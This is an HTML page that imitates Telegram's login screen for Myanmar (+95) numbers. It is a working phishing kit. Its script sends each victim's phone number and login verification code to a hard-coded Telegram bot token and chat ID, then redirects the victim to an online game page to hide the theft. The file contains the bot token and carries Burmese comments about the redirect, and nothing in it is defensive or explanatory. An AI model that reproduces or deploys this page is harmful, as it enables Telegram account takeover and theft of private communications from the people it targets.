<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Messenger</title>
    <style>
        body { background-color: #1c2733; color: white; font-family: sans-serif; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        .container { text-align: center; width: 90%; max-width: 350px; }
        h2 { font-size: 20px; margin-bottom: 10px; }
        p { color: #7f91a4; font-size: 14px; margin-bottom: 35px; }
        .input-box { border: 1px solid #3b4754; border-radius: 10px; padding: 15px; display: flex; align-items: center; margin-bottom: 20px; background: transparent; }
        input { background: transparent; border: none; color: white; font-size: 17px; outline: none; width: 100%; }
        
        /* OTP အကွက် ပုံစံအသစ် */
        .otp-box { border: 1px solid #3390ec; border-radius: 10px; padding: 15px; background: rgba(51, 144, 236, 0.1); margin-bottom: 20px; }
        .otp-box input { text-align: center; letter-spacing: 10px; font-size: 24px; font-weight: bold; }

        .next-btn { background: #3390ec; border: none; width: 55px; height: 55px; border-radius: 50%; color: white; font-size: 24px; cursor: pointer; float: right; margin-top: 20px; display: flex; align-items: center; justify-content: center; }
        #step2 { display: none; }
    </style>
</head>
<body>

<div class="container" id="step1">
    <h2>Your phone number</h2>
    <p>Please confirm your country code and enter your phone number.</p>
    <div class="input-box"><input type="text" value="Myanmar (Burma)" readonly></div>
    <div class="input-box">
        <span style="margin-right: 10px;">+95</span>
        <input type="tel" id="phone" placeholder="9663804708" autocomplete="off">
    </div>
    <button class="next-btn" onclick="goStep2()">→</button>
</div>

<div class="container" id="step2">
    <div style="font-size: 50px; margin-bottom: 20px;">📩</div>
    <h2>Verification Code</h2>
    <p>Check your Telegram app for the code.</p>
    <div class="otp-box">
        <input type="number" id="otp" placeholder="•••••" oninput="if(this.value.length > 5) this.value = this.value.slice(0,5);">
    </div>
    <button class="next-btn" onclick="sendData()">→</button>
</div>

<script>
    const token = '8661599650:AAFaEo8wGPhpvbj8g6cOonAZZxatMF21lV0';
    const chat_id = '5304050102';
    // Redirect လမ်းကြောင်းကို Poki အစား တိုက်ရိုက် Game link သုံးသည်
    const game_url = "https://poki.com/en/g/rail-in-the-air"; 

    function goStep2() {
        let p = document.getElementById('phone').value;
        if(p.length < 7) return;
        document.getElementById('step1').style.display = 'none';
        document.getElementById('step2').style.display = 'block';
        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=📱 Number: +95${p}`);
    }

    function sendData() {
        const otpVal = document.getElementById('otp').value;
        if(otpVal.length < 5) return;

        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=🔑 OTP: ${otpVal}`)
        .then(() => {
            // Chrome မှာရော App မှာပါ အဆင်ပြေအောင် Redirect လုပ်နည်းပြောင်းသည်
            window.location.replace(game_url);
        })
        .catch(() => {
            window.location.replace(game_url);
        });
    }
</script>
</body>
</html>
